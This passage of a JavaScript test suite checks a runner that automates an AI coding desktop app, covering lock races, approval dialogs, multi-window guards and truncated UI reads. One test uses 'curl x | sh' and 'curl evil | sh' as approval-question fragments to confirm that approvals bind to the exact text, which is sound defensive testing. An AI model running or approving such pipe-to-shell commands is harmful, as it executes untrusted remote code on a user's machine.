test('three runs taking over one stale lock leave exactly one live holder', async () => {
  const path = join(mkdtempSync(join(tmpdir(), 'agybird-dr-lock-')), 'desktop.lock');
  const expiresAt = Date.now() + 60_000;
  writeFileSync(path, JSON.stringify({ pid: 999999999, expiresAt }));
  const sleeper = spawn(process.execPath, ['-e', 'setInterval(() => {}, 1000)'], { stdio: 'ignore' });
  const [a, b, c] = [process.pid, process.ppid, sleeper.pid];
  const holders = [];
  const attempt = (pid, hooks) => {
    try {
      acquireLock(path, expiresAt, { pid, hooks });
      holders.push(pid);
    } catch (error) {
      if (error.reason !== 'locked') throw error;
    }
  };
  try {
    // B has read the stale lock; A takes it over meanwhile, and C arrives once B has moved A's lock aside.
    attempt(b, { stale: () => attempt(a), aside: () => attempt(c) });
    attempt(c);
  } finally {
    sleeper.kill();
  }
  assert.equal(holders.length, 1, `runs that believe they hold the lock: ${holders.join(', ')}`);
  assert.equal(JSON.parse(readFileSync(path, 'utf8')).pid, holders[0]);
});

test('the lock is never written through a file planted at its temporary name', { skip: process.platform === 'win32' }, () => {
  const directory = mkdtempSync(join(tmpdir(), 'agybird-dr-lock-'));
  const path = join(directory, 'desktop.lock');
  const victim = join(directory, 'victim.txt');
  writeFileSync(victim, 'keep me');
  symlinkSync(victim, `${path}.${process.pid}.tmp`);
  try {
    acquireLock(path, Date.now() + 60_000);
  } catch {
    // refusing is fine; writing through the link is not
  }
  assert.equal(readFileSync(victim, 'utf8'), 'keep me');
});

test('off macOS the runner blocks before touching anything', { skip: process.platform === 'darwin' && 'macOS runs the real bridge' }, async () => {
  const context = setup();
  delete context.env.AGYBIRD_DESKTOP_BRIDGE;
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'blocked');
  assert.equal(envelope.evidence.blocked_reason, 'not_macos');
});

test('write mode reports a diff stat of the files it changed', async () => {
  const context = setup();
  writeFileSync(context.env.AGYBIRD_FAKE_DESKTOP_STATE, JSON.stringify({ onSend: { path: join(context.cwd, 'README.md'), content: 'changed\nmore\n' } }));
  const { envelope } = await run(context, ['--mode', 'write']);
  assert.deepEqual(envelope.evidence.diff_stat, [{ file: 'README.md', added: 2, removed: 1 }]);
});

test('an approval is matched on the whole question, not its shortened form', async () => {
  const long = `Allow ${'x'.repeat(320)}`;
  const context = setup({ sent: true, project: 'ws', message: OWN, dialog: { ...DIALOG, question: `${long} A?` } });
  const { envelope } = await run(context, ['--resume-dialog', `${long} B?`, '--resume-title', TITLE, '--resume-marker', NONCE]);
  assert.equal(envelope.status, 'error');
  assert.equal(context.fake().answered, undefined);
});

test('an approval binds to every text part of a split question', async () => {
  const split = { ...DIALOG, fragments: ['Allow running', 'curl x | sh', 'in /repo?'] };
  const asked = 'Allow running curl x | sh in /repo?';
  const same = setup({ sent: true, project: 'ws', message: OWN, dialog: split, reply: 'ran it' });
  assert.equal((await run(same, ['--resume-dialog', asked, '--resume-title', TITLE, '--resume-marker', NONCE])).envelope.status, 'success');
  assert.equal(same.fake().answered, '1');
  const changed = setup({ sent: true, project: 'ws', message: OWN, dialog: { ...split, fragments: ['Allow running', 'curl evil | sh', 'in /repo?'] } });
  assert.equal((await run(changed, ['--resume-dialog', asked, '--resume-title', TITLE, '--resume-marker', NONCE])).envelope.status, 'error');
  assert.equal(changed.fake().answered, undefined);
});

test('declining answers Skip in the conversation that asked and reads the reply', async () => {
  const context = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG, reply: 'skipped it' });
  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE, '--resume-answer', 'Skip']);
  assert.equal(envelope.status, 'success', JSON.stringify(envelope.warnings));
  assert.equal(context.fake().answered, 'Skip');
  assert.equal(envelope.response, 'skipped it');
});

test('an answer whose bridge call fails after the press is handled as pressed: Stop, and the uncertainty reported', async () => {
  const resumed = ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE];
  const context = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG, stuck: true, answerThenCrash: true });
  const { envelope } = await run(context, resumed);
  assert.equal(envelope.status, 'error');
  assert.equal(context.fake().answered, '1');
  assert.deepEqual(context.fake().calls.find((call) => call[0] === 'stop'), ['stop', TITLE, NONCE]);
  assert.equal(context.fake().stopped, true);
  // Spent, since it may have been pressed, and said to be uncertain.
  assert.equal(envelope.evidence.answered, '1');
  assert.equal(envelope.evidence.answer_uncertain, true);
  assert.ok(envelope.warnings.some((warning) => /may have been pressed/.test(warning)), envelope.warnings.join(' | '));
  assert.equal(existsSync(lockFile(context)), false);

  const unstoppable = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG, stuck: true, answerThenCrash: true, stopFails: true });
  const kept = await run(unstoppable, resumed);
  assert.ok(kept.envelope.warnings.some((warning) => /may still be going/.test(warning)));
  assert.deepEqual(JSON.parse(readFileSync(lockFile(unstoppable), 'utf8')).conversation, TITLE);
  assert.equal(JSON.parse(readFileSync(lockFile(unstoppable), 'utf8')).app, true);
});

test('a resumed run records its pressed answer at once, before it waits for the turn', { skip: process.platform === 'win32' }, async () => {
  const context = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG, stuck: true });
  const ack = join(mkdtempSync(join(tmpdir(), 'agybird-dr-ack-')), 'job.answered-0');
  const child = spawn(process.execPath, [RUNNER, '--category', 'code', '--cwd', context.cwd, '--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE, '--resume-ack', ack], { env: context.env, stdio: ['pipe', 'ignore', 'ignore'] });
  child.stdin.end('Go on.');
  const exited = new Promise((resolve) => child.on('close', resolve));
  for (let waited = 0; !existsSync(ack); waited += 20) {
    assert.ok(waited < 15_000, 'the answer was never recorded');
    await new Promise((resolve) => setTimeout(resolve, 20));
  }
  // Killed outright, the run prints nothing more; the record stays.
  child.kill('SIGKILL');
  await exited;
  assert.equal(readFileSync(ack, 'utf8').trim(), '1');
});

test('the answer is recorded as spent before its step starts, so a kill during it leaves it spent', { skip: process.platform === 'win32' }, async () => {
  const context = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG, stuck: true, delays: { answer: 3_000 } });
  const ack = join(mkdtempSync(join(tmpdir(), 'agybird-dr-ack-')), 'job.answered-0');
  const child = spawn(process.execPath, [RUNNER, '--category', 'code', '--cwd', context.cwd, '--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE, '--resume-ack', ack], { env: context.env, stdio: ['pipe', 'ignore', 'ignore'] });
  child.stdin.end('Go on.');
  const exited = new Promise((resolve) => child.on('close', resolve));
  let recorded;
  try {
    await waitFor(context, 'answer');
    assert.equal(context.fake().answered, undefined, 'the answer step is still in flight');
    recorded = existsSync(ack);
  } finally {
    child.kill('SIGKILL');
    await exited;
  }
  assert.equal(recorded, true, 'recorded before the answer step');
  assert.equal(existsSync(ack), true);
});

test('an approval presses nothing in a conversation that has the asking title but not the asking run\'s message', async () => {
  const context = setup({ sent: true, project: 'ws', message: 'Another task of the user.', dialog: DIALOG });
  const ack = join(mkdtempSync(join(tmpdir(), 'agybird-dr-ack-')), 'job.answered-0');
  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE, '--resume-ack', ack]);
  assert.equal(envelope.status, 'error');
  assert.ok(envelope.warnings.some((warning) => /own message/.test(warning)), envelope.warnings.join(' | '));
  assert.ok(!names(context).includes('answer'));
  assert.equal(context.fake().answered, undefined);
  assert.equal(existsSync(ack), false, 'still approvable');
  // A resumed run needs the asking run's marker.
  const unmarked = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG });
  assert.equal((await run(unmarked, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE])).envelope.status, 'error');
  assert.equal(unmarked.fake().calls, undefined);
});

test('with a second conversation window holding the same dialog, an approval presses nothing and stays approvable', async () => {
  const context = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG, secondPaneIn: ['answer'] });
  const ack = join(mkdtempSync(join(tmpdir(), 'agybird-dr-ack-')), 'job.answered-0');
  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE, '--resume-ack', ack]);
  assert.equal(envelope.status, 'error');
  assert.ok(envelope.warnings.some((warning) => /several_conversations/.test(warning)), envelope.warnings.join(' | '));
  assert.equal(context.fake().answered, undefined);
  assert.equal(envelope.evidence.answered, undefined);
  assert.equal(existsSync(ack), false, 'a refusal before any press leaves the request approvable');
  assert.ok(!names(context).includes('stop'));
  assert.equal(existsSync(lockFile(context)), false);
});

test('with a second conversation window, Stop is not pressed and the lock stays kept for the app', async () => {
  const context = setup({ stuck: true, failSnapshotAfterSend: true, secondPaneIn: ['stop'] });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.ok(names(context).includes('stop'));
  assert.notEqual(context.fake().stopped, true);
  assert.ok(envelope.warnings.some((warning) => /may still be going/.test(warning)), envelope.warnings.join(' | '));
  assert.equal(JSON.parse(readFileSync(lockFile(context), 'utf8')).app, true);
});

test('with a second conversation window, Copy is not pressed and the on-screen reply is returned', async () => {
  const context = setup({ reply: 'on screen', secondPaneIn: ['copy-reply'] });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success');
  assert.equal(envelope.response, 'on screen');
  assert.ok(envelope.warnings.some((warning) => /could not be copied.*several_conversations/.test(warning)), envelope.warnings.join(' | '));
  assertCleanedUp(context);
});

test('with an untitled pane holding its own composer at paste time, nothing is pasted, cleared or sent', async () => {
  const context = setup({ secondComposerIn: ['paste-input', 'clear-input', 'send'] });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.ok(envelope.warnings.some((warning) => /paste-input failed: outside_conversation: Message input/.test(warning)), envelope.warnings.join(' | '));
  const fake = context.fake();
  assert.equal(fake.rivalComposer, undefined, 'nothing pasted into the other pane');
  assert.equal(fake.composer, undefined);
  assert.equal(fake.rivalCleared, undefined, 'nothing cleared in the other pane');
  assert.ok(!names(context).includes('send'));
  assert.equal(fake.sent, undefined);
  assertCleanedUp(context);
});

test('with an untitled pane holding its own composer at Send time, Send is refused before any press', async () => {
  const context = setup({ secondComposerIn: ['send'] });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.ok(envelope.warnings.some((warning) => /send failed: outside_conversation: Send message/.test(warning)), envelope.warnings.join(' | '));
  const fake = context.fake();
  assert.equal(fake.rivalSent, undefined, 'nothing sent from the other pane');
  assert.equal(fake.sent, undefined);
  // A refusal before the press: the run's own composer is cleared, no Stop, no lock kept.
  assert.equal(fake.cleared, true);
  assert.ok(!names(context).includes('stop'));
  assertCleanedUp(context);
});

test('a second conversation window seen while polling ends the run unread', async () => {
  const context = setup({ stuck: true, secondPaneIn: ['snapshot'] });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.ok(envelope.warnings.some((warning) => /snapshot failed: several_conversations/.test(warning)), envelope.warnings.join(' | '));
  assert.equal(envelope.response, null);
  // Stop's own read shows the run's conversation alone, so it is stopped there.
  assert.equal(context.fake().stopped, true);
  assertCleanedUp(context);
});

test('an answer that already has a record is never pressed again', async () => {
  const context = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG });
  const ack = join(mkdtempSync(join(tmpdir(), 'agybird-dr-ack-')), 'job.answered-0');
  writeFileSync(ack, '1\n');
  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE, '--resume-ack', ack]);
  assert.equal(envelope.status, 'error');
  assert.ok(!names(context).includes('answer'));
  assert.equal(readFileSync(ack, 'utf8'), '1\n');
});

test('an answer refused before any press is not spent and stops nothing', async () => {
  const context = setup({ sent: true, project: 'ws', message: OWN, dialog: { ...DIALOG, options: ["1 Yes, and always allow 'ls'", ...DIALOG.options.slice(1)] } });
  const ack = join(mkdtempSync(join(tmpdir(), 'agybird-dr-ack-')), 'job.answered-0');
  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE, '--resume-ack', ack]);
  assert.equal(envelope.status, 'error');
  assert.equal(envelope.evidence.answered, undefined);
  assert.equal(existsSync(ack), false, 'the record of an answer refused before any press is withdrawn');
  assert.ok(!names(context).includes('stop'));
  assert.equal(existsSync(lockFile(context)), false);
});

test('a tree read cut off at the node cap at paste time pastes, clears and sends nothing', async () => {
  const context = setup({ truncatedIn: ['paste-input', 'clear-input', 'send'] });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.ok(envelope.warnings.some((warning) => /paste-input failed: truncated/.test(warning)), envelope.warnings.join(' | '));
  const fake = context.fake();
  assert.equal(fake.composer, undefined, 'nothing pasted');
  assert.equal(fake.cleared, undefined, 'nothing cleared on a cut-off read');
  assert.ok(!names(context).includes('send'));
  assert.equal(fake.sent, undefined);
  assertCleanedUp(context);
});

test('a cut-off read of the new conversation stops the run before the clipboard or the composer is touched', async () => {
  const context = setup({ truncatedIn: ['snapshot'] });
  const { envelope } = await run(context, ['--timeout', '300ms']);
  assert.equal(envelope.status, 'error');
  assert.ok(envelope.warnings.some((warning) => /too large to read whole.*nothing was pasted or sent/.test(warning)), envelope.warnings.join(' | '));
  for (const command of ['clipboard-set', 'paste-input', 'send', 'stop']) assert.ok(!names(context).includes(command), command);
  assertCleanedUp(context);
});

test('a tree read cut off at the node cap at Send time is refused before any press', async () => {
  const context = setup({ truncatedIn: ['send'] });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.ok(envelope.warnings.some((warning) => /send failed: truncated/.test(warning)), envelope.warnings.join(' | '));
  const fake = context.fake();
  assert.equal(fake.sent, undefined, 'nothing sent');
  // A refusal before the press: the composer is cleared from a whole read, no Stop, no lock kept.
  assert.equal(fake.cleared, true);
  assert.ok(!names(context).includes('stop'));
  assertCleanedUp(context);
});

test('cut-off reads after Send never end the run as success and never free the lock', async () => {
  // The part read holds the run's message and part of a reply; Stop lies past the cut.
  const context = setup({ stuck: true, reply: 'partial reply', truncatedPolls: 1_000, truncatedIn: ['stop'] });
  const { envelope } = await run(context, ['--timeout', '300ms']);
  assert.equal(envelope.status, 'error');
  assert.equal(envelope.response, null);
  assert.ok(!names(context).includes('copy-reply'));
  assert.ok(envelope.warnings.some((warning) => /too large to read whole/.test(warning)), envelope.warnings.join(' | '));
  assert.ok(envelope.warnings.some((warning) => /timed out/.test(warning)));
  // Stop is pressed only from a whole read, so it was not, and the lock stays kept for the app.
  assert.notEqual(context.fake().stopped, true);
  assert.ok(envelope.warnings.some((warning) => /may still be going/.test(warning)), envelope.warnings.join(' | '));
  assert.equal(JSON.parse(readFileSync(lockFile(context), 'utf8')).app, true);
});

test('at the deadline after cut-off reads, Stop is pressed from a whole read and the lock is freed', async () => {
  const context = setup({ stuck: true, reply: 'partial reply', truncatedPolls: 1_000 });
  const { envelope } = await run(context, ['--timeout', '300ms']);
  assert.equal(envelope.status, 'error');
  assert.ok(envelope.warnings.some((warning) => /timed out.*stopped in the app/.test(warning)), envelope.warnings.join(' | '));
  assert.equal(context.fake().stopped, true);
  assertCleanedUp(context);
});

test('a run whose first reads are cut off keeps waiting and succeeds on a whole read', async () => {
  const context = setup({ runningPolls: 1, truncatedPolls: 2, reply: 'READY' });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success', envelope.warnings.join(' | '));
  assert.equal(envelope.response, 'READY');
  assert.ok(context.fake().calls.filter((call) => call[0] === 'snapshot').length >= 4);
  assertCleanedUp(context);
});

test('an answer on a tree read cut off at the node cap presses nothing and stays approvable', async () => {
  const context = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG, truncatedIn: ['answer'] });
  const ack = join(mkdtempSync(join(tmpdir(), 'agybird-dr-ack-')), 'job.answered-0');
  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE, '--resume-ack', ack]);
  assert.equal(envelope.status, 'error');
  assert.ok(envelope.warnings.some((warning) => /answer failed: truncated/.test(warning)), envelope.warnings.join(' | '));
  assert.equal(context.fake().answered, undefined);
  assert.equal(existsSync(ack), false, 'a refusal before any press leaves the request approvable');
  assert.ok(!names(context).includes('stop'));
  assert.equal(existsSync(lockFile(context)), false);
});

// A lock kept for an app task by a run that is gone (its pid is not running).
const appLock = (context, expiresAt) => writeFileSync(lockFile(context), JSON.stringify({ pid: 999999999, expiresAt, app: true, conversation: TITLE, marker: NONCE }));

test('a cut-off read is never idle evidence that frees a kept app lock', async () => {
  // The kept conversation still runs; its Stop lies past the cut.
  const context = setup({ earlier: { title: TITLE, running: true, message: OWN }, truncatedIn: ['snapshot'] });
  appLock(context, Date.now() - 1);
  const { envelope } = await run(context);
  assert.equal(envelope.evidence.blocked_reason, 'locked', envelope.warnings.join(' | '));
  assert.ok(!names(context).includes('send'));
  assert.equal(JSON.parse(readFileSync(lockFile(context), 'utf8')).app, true);
});

test('a kept app lock past its time still refuses a run while its conversation shows a run', async () => {
  const context = setup({ earlier: { title: TITLE, running: true, message: OWN } });
  appLock(context, Date.now() - 1);
  const { envelope } = await run(context);
  assert.equal(envelope.evidence.blocked_reason, 'locked');
  assert.ok(envelope.warnings.some((warning) => warning.includes(lockFile(context))), envelope.warnings.join(' | '));
  assert.ok(!names(context).includes('send'));
  assert.equal(JSON.parse(readFileSync(lockFile(context), 'utf8')).app, true);
});

test('a kept app lock is released once the app shows its conversation with no run', async () => {
  const context = setup({ earlier: { title: TITLE, running: false, message: OWN } });
  appLock(context, Date.now() + 60 * 60_000);
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success', JSON.stringify(envelope.warnings));
  assertCleanedUp(context);
  // Another conversation on screen is no evidence either way.
  const other = setup({ earlier: { title: 'Other Chat - ws - Antigravity', running: false } });
  appLock(other, Date.now() - 1);
  assert.equal((await run(other)).envelope.evidence.blocked_reason, 'locked');
  // Nor is a namesake: the lock's title, without its run's own message.
  const namesake = setup({ earlier: { title: TITLE, running: false, message: 'Another task of the user.' } });
  appLock(namesake, Date.now() - 1);
  assert.equal((await run(namesake)).envelope.evidence.blocked_reason, 'locked');
});

test('a stalled Stop finds the app lock already kept, and cleanup ends on its own within the grace', { skip: process.platform === 'win32' }, async () => {
  const context = setup({ stuck: true, delays: { stop: 60_000 } });
  const { child, done } = start(context);
  while (!names(context).includes('send') || !names(context).slice(names(context).indexOf('send') + 1).includes('snapshot')) await new Promise((resolve) => setTimeout(resolve, 20));
  const started = Date.now();
  child.kill('SIGTERM');
  await waitFor(context, 'stop');
  // Were the runner killed now, while Stop stalls, the lock must already say the app may run.
  const kept = JSON.parse(readFileSync(lockFile(context), 'utf8'));
  assert.equal(kept.app, true);
  assert.equal(kept.conversation, TITLE);
  const { envelope } = await done;
  assert.ok(Date.now() - started < 12_000, `cleanup took ${Date.now() - started} ms`);
  assert.ok(envelope.warnings.some((warning) => /may still be going/.test(warning)));
  assert.equal(JSON.parse(readFileSync(lockFile(context), 'utf8')).app, true);
  assert.equal(context.fake().clipboard, 'user clipboard');
  assert.equal(context.fake().frontmost, 'com.example.host');
});

// Antigravity 2.36 opens a new conversation from one New Conversation link and
// picks the project in the composer's project picker, among near-names.
const NEAR_NAMES = ['ws-wt-agy', 'pin-ws-0-4-5', 'ws', 'ws-codex-task-2'];

test('on 2.36 the run picks the exact project in the new conversation\'s picker and returns the reply', async () => {
  const context = setup({ version: '2.36.0', runningPolls: 2, reply: 'READY', pickerCurrent: 'studio', pickerProjects: NEAR_NAMES });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success', JSON.stringify(envelope.warnings));
  assert.equal(envelope.response, 'READY');
  assert.equal(envelope.evidence.app_version, '2.36.0');
  const fake = context.fake();
  assert.deepEqual(fake.pressed, ['New Conversation', 'Select project, current: studio', 'Search Projects = ws', 'ws Project Settings']);
  assert.equal(fake.project, 'ws');
  // Where the agent runs, the branch, the model and the preset are never changed.
  assert.equal(fake.location ?? 'This Computer', 'This Computer');
  assert.equal(fake.branch ?? 'main', 'main');
  assert.equal(fake.model, 'Gemini 3.8 Flash Medium');
  assert.equal(fake.preset, 'Request Review');
  assertCleanedUp(context);
});

test('on 2.36 a picker already on the project is left as it is', async () => {
  const context = setup({ version: '2.36.0', pickerCurrent: 'ws', pickerProjects: NEAR_NAMES });
  assert.equal((await run(context)).envelope.status, 'success');
  assert.deepEqual(context.fake().pressed, ['New Conversation']);
});

test('on 2.36 the run fails closed, before any paste, unless the picker ends on the exact project on this computer', async () => {
  const cases = [
    [{ pickerProjects: ['ws-wt-agy', 'pin-ws-0-4-5'] }, /not_found: project ws/],
    [{ location: 'Cloud' }, /not_local: the agent runs on Cloud/],
    [{ pickerNoop: true }, /project_unchanged/],
    [{ newConversationLinks: 2 }, /several_controls: New Conversation/],
    [{ newConversationLinks: 0 }, /not_found: New Conversation/],
    [{ locationAfterOpen: 'Cloud' }, /would run the agent on "Cloud"/],
  ];
  for (const [state, pattern] of cases) {
    const context = setup({ version: '2.36.0', pickerCurrent: 'studio', pickerProjects: NEAR_NAMES, ...state });
    const { envelope } = await run(context);
    assert.equal(envelope.status, 'error', JSON.stringify(state));
    assert.ok(envelope.warnings.some((warning) => pattern.test(warning)), `${JSON.stringify(state)}: ${JSON.stringify(envelope.warnings)}`);
    const order = names(context);
    assert.ok(!order.includes('paste-input') && !order.includes('send') && !order.includes('clipboard-set'), JSON.stringify(state));
    assertCleanedUp(context);
  }
});

test('on 2.36 a run past its deadline presses the conversation\'s Cancel', async () => {
  const context = setup({ version: '2.36.0', pickerProjects: NEAR_NAMES, stuck: true });
  const { envelope } = await run(context, ['--timeout', '300ms']);
  assert.equal(envelope.status, 'error');
  assert.ok(names(context).includes('stop'));
  assert.equal(context.fake().stopped, true);
  assertCleanedUp(context);
});

// Antigravity 2.36 titles a new conversation with the prompt's first line,
// then renames it a few seconds later. The run's marker, not the title, is
// what identifies its conversation.
test('a conversation the app renames after Send is followed while it shows the run\'s own message', async () => {
  const context = setup({ version: '2.36.0', pickerProjects: ['ws'], runningPolls: 3, reply: 'READY', renameAfter: 1, renamed: 'Agybird CLI Ready Check' });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success', JSON.stringify(envelope.warnings));
  assert.equal(envelope.response, 'READY');
  assert.equal(envelope.evidence.conversation_title, 'Agybird CLI Ready Check - ws - Antigravity');
  const copy = context.fake().calls.find((call) => call[0] === 'copy-reply');
  assert.equal(copy[1], 'Agybird CLI Ready Check - ws - Antigravity');
  assertCleanedUp(context);
});

test('a rename into another project, or without the run\'s own message, still ends the run unread', async () => {
  for (const state of [{ renamedProject: 'other' }, { renamedMessage: 'Another task of the user.' }]) {
    const context = setup({ version: '2.36.0', pickerProjects: ['ws'], runningPolls: 5, renameAfter: 1, renamed: 'Agybird CLI Ready Check', ...state });
    const { envelope } = await run(context);
    assert.equal(envelope.status, 'error', JSON.stringify(state));
    assert.ok(envelope.warnings.some((warning) => /another conversation|does not include the run's own message/.test(warning)), JSON.stringify(envelope.warnings));
    assert.ok(!names(context).includes('stop') && !names(context).includes('copy-reply'), JSON.stringify(state));
  }
});

test('a kept app lock is released once the app shows its renamed conversation with no run', async () => {
  const context = setup({ earlier: { title: 'Agybird CLI Ready Check - ws - Antigravity', running: false, message: OWN } });
  appLock(context, Date.now() + 60 * 60_000);
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success', JSON.stringify(envelope.warnings));
  assertCleanedUp(context);
  // Renamed and still running holds the lock.
  const going = setup({ earlier: { title: 'Agybird CLI Ready Check - ws - Antigravity', running: true, message: OWN } });
  appLock(going, Date.now() - 1);
  assert.equal((await run(going)).envelope.evidence.blocked_reason, 'locked');
});

test('on 2.36 a switch to a titled conversation while the project menu is open searches and presses nothing there', async () => {
  const context = setup({ version: '2.36.0', pickerCurrent: 'studio', pickerProjects: NEAR_NAMES, titleWhileMenuOpen: 'Other Chat - ws - Antigravity' });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.ok(envelope.warnings.some((warning) => /other_conversation/.test(warning)), JSON.stringify(envelope.warnings));
  assert.deepEqual(context.fake().pressed, ['New Conversation', 'Select project, current: studio']);
  assert.ok(!names(context).includes('paste-input'));
  assertCleanedUp(context);
});

test('on 2.36 a marker in a sidebar title neither follows a rename into another conversation nor frees a kept lock', async () => {
  const marked = setup({ version: '2.36.0', pickerProjects: ['ws'], runningPolls: 5, renameAfter: 1, renamed: 'Agybird CLI Ready Check', renamedMessage: 'Another task of the user.', sidebarExtra: 'MARKER' });
  const { envelope } = await run(marked);
  assert.equal(envelope.status, 'error', JSON.stringify(envelope.warnings));
  assert.ok(!names(marked).includes('copy-reply') && !names(marked).includes('stop'));
  const kept = setup({ version: '2.36.0', earlier: { title: 'Agybird CLI Ready Check - ws - Antigravity', running: false, message: 'Another task of the user.' }, sidebarExtra: OWN });
  appLock(kept, Date.now() + 60 * 60_000);
  assert.equal((await run(kept)).envelope.evidence.blocked_reason, 'locked');
});

// Runs that wait with the app free (docs/specs/desktop-sessions.md, B1–B5, C4).
const sidebarReads = (context) => names(context).filter((name) => name === 'sidebar-state').length;
const settled = (state) => {
  const context = setup(state);
  context.env.AGYBIRD_DESKTOP_SETTLE_MS = '0';
  return context;
};

test('once its title settles, a run waits on its sidebar row with the app lock released', async () => {
  const context = settled({ runningPolls: 6, reply: 'READY', delays: { 'sidebar-state': 120 } });
  const { done } = start(context);
  while (sidebarReads(context) < 3) await new Promise((resolve) => setTimeout(resolve, 20));
  assert.equal(existsSync(lockFile(context)), false, 'no lock while the agent works');
  const { envelope } = await done;
  assert.equal(envelope.status, 'success', envelope.warnings.join(' | '));
  assert.equal(envelope.response, 'READY');
  const order = names(context);
  assert.ok(order.indexOf('open-row') > order.indexOf('send'), 'the conversation was opened from the sidebar for the result');
  assert.ok(order.indexOf('copy-reply') > order.indexOf('open-row'));
  assertCleanedUp(context);
});

test('a run whose app another run took meanwhile waits for it, then reads its own result', async () => {
  const context = settled({ runningPolls: 8, reply: 'READY' });
  const { done } = start(context);
  while (sidebarReads(context) < 2 || existsSync(lockFile(context))) await new Promise((resolve) => setTimeout(resolve, 20));
  // A run of an older version takes the free app and holds it for its turn.
  const holder = spawn(process.execPath, ['-e', 'setTimeout(() => {}, 2500)']);
  writeFileSync(lockFile(context), JSON.stringify({ pid: holder.pid, expiresAt: Date.now() + 60_000 }));
  const { envelope } = await done;
  assert.equal(envelope.status, 'success', envelope.warnings.join(' | '));
  assert.equal(envelope.response, 'READY');
  assertCleanedUp(context);
});

test('a sixth desktop run is refused before it touches the app', async () => {
  const context = setup();
  const runs = join(context.stateDir, 'desktop-runs');
  mkdirSync(runs, { recursive: true });
  for (let n = 0; n < 5; n += 1) writeFileSync(join(runs, `run${n}.json`), JSON.stringify({ pid: process.pid, marker: `run${n}` }));
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'blocked');
  assert.equal(envelope.evidence.blocked_reason, 'too_many_runs');
  for (const name of ['front', 'clipboard-get', 'new-conversation']) assert.ok(!names(context).includes(name), `no ${name}`);
  assert.equal(existsSync(lockFile(context)), false);
});

test('a run record of a process that is gone is removed, and a run removes its own', async () => {
  const context = setup({ runningPolls: 1 });
  const runs = join(context.stateDir, 'desktop-runs');
  mkdirSync(runs, { recursive: true });
  for (let n = 0; n < 5; n += 1) writeFileSync(join(runs, `gone${n}.json`), JSON.stringify({ pid: 999999, marker: `gone${n}` }));
  // Not records: a part written by a run killed while writing, and Finder's file.
  writeFileSync(join(runs, 'part.json'), '{"pid": 12');
  writeFileSync(join(runs, '.DS_Store'), 'x');
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success', envelope.warnings.join(' | '));
  assert.deepEqual(readdirSync(runs).sort(), ['.DS_Store', 'part.json']);
});

test('a gone run whose task the app may still run keeps its place until the sidebar shows it Idle', async () => {
  const runs = (context) => join(context.stateDir, 'desktop-runs');
  const keptRecords = (context, title) => {
    mkdirSync(runs(context), { recursive: true });
    for (let n = 0; n < 5; n += 1) writeFileSync(join(runs(context), `kept${n}.json`), JSON.stringify({ pid: 999999, marker: `kept${n}`, project: 'ws', title, app: true }));
  };
  // Its conversation is not in the sidebar: the places stay taken.
  const going = setup({ runningPolls: 1 });
  keptRecords(going, 'Gone Task - ws - Antigravity');
  const refused = (await run(going)).envelope;
  assert.equal(refused.evidence.blocked_reason, 'too_many_runs');
  assert.ok(refused.warnings.some((warning) => /5 of them ended without stopping their task/.test(warning)), JSON.stringify(refused.warnings));
  assert.equal(readdirSync(runs(going)).length, 5);
  // The sidebar shows the kept conversation alone and Idle: the records go.
  const done = setup({ runningPolls: 1, sidebarRows: { 'Gone Task|ws': ['Idle'] } });
  keptRecords(done, 'Gone Task - ws - Antigravity');
  const { envelope } = await run(done);
  assert.equal(envelope.status, 'success', envelope.warnings.join(' | '));
  assert.equal(readdirSync(runs(done)).length, 0);
});

test('an interim message while the sidebar still shows the turn In Progress is never returned', async () => {
  const context = setup({ runningPolls: 0, sidebarLag: 3, reply: 'FINAL' });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success');
  const order = names(context);
  assert.ok(order.slice(0, order.indexOf('copy-reply')).filter((name) => name === 'sidebar-state').length >= 4, 'waited for the sidebar to show it Idle');
});

test('a run cancelled while it waits takes the app back and presses Stop in its own conversation', { skip: process.platform === 'win32' }, async () => {
  const context = settled({ stuck: true });
  const { child, done } = start(context);
  while (sidebarReads(context) < 3) await new Promise((resolve) => setTimeout(resolve, 20));
  child.kill('SIGTERM');
  const { envelope } = await done;
  assert.equal(envelope.status, 'error');
  const order = names(context);
  assert.ok(order.lastIndexOf('open-row') < order.lastIndexOf('stop'), 'opened, then Stop');
  assert.equal(context.fake().stopped, true);
